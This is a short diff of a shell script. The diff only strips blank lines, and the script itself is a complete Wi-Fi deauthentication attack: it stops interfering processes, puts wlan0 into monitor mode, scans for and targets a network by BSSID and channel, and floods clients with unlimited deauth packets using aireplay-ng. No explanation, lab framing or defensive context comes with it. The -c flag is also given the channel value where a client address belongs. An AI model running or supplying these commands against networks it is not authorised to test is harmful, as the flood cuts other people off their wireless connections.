@@ -1,9 +1,5 @@
-
 sudo airmon-ng check kill
 sudo airmon-ng start "wlan0"  
 sudo airodump-ng "wlan0" 
 sudo airodump-ng "wlan0" --bssid "$bssid" --channel "$channel"
 sudo aireplay-ng "wlan0" -a "$bssid" -c "$channel" --deauth 0
-
-
-
